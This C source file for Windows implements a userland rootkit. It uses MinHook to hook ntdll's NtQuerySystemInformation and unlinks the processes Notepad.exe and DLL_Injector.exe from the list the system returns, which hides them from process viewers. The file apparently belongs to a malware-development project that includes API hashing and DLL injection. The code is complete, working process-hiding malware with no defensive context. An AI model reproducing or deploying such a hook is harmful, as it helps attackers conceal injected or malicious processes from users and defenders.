#include <Windows.h>
#include <stdio.h>
#include "structs.h"
#include "ApiHashing.h"
#include "common.h"
#include "Hooks.h"
#include "vanWin.h"
#include "TypeDef.h"
#include "MinHook.h"
#include <Shlwapi.h>


fnNtQuerySystemInformation __NtQuerySystemInformation;
fnNtQuerySystemInformation newNtQuery;

NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    NTSTATUS stat = newNtQuery(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && stat == 0)
    {
        PSYSTEM_PROCESS_INFORMATION prev = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)prev + prev->NextEntryOffset);

        while (prev->NextEntryOffset != 0) {
            if (!lstrcmp(curr->ImageName.Buffer, TEXT("Notepad.exe"))) {
                if (curr->NextEntryOffset == 0) {
                    prev->NextEntryOffset = 0;		// if above process is at last
                }
                else {
                    prev->NextEntryOffset += curr->NextEntryOffset;
                }
                curr = prev;
            }
            if (!lstrcmp(curr->ImageName.Buffer, L"DLL_Injector.exe")) {
                if (curr->NextEntryOffset == 0) {
                    prev->NextEntryOffset = 0;
                }
                else {
                    prev->NextEntryOffset += curr->NextEntryOffset;
                }
                curr = prev;
            }
            prev = curr;
            curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
        }
    }

    return stat;
}

BOOL InstallHook() {

    __NtQuerySystemInformation = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");

    if (MH_Initialize() != MH_OK) {
        return FALSE;
    }
    
    if (MH_CreateHook(__NtQuerySystemInformation, &hookedNtQuery, &newNtQuery) != MH_OK) {
        return FALSE;
    }

    if (MH_EnableHook(__NtQuerySystemInformation) != MH_OK) {
        return FALSE;
    }

    return TRUE;
}

BOOL UnHook() {

    if (MH_DisableHook(__NtQuerySystemInformation) != MH_OK) {
        return FALSE;
    }

    if (MH_Uninitialize() != MH_OK) {
        return FALSE;
    }

    return TRUE;
}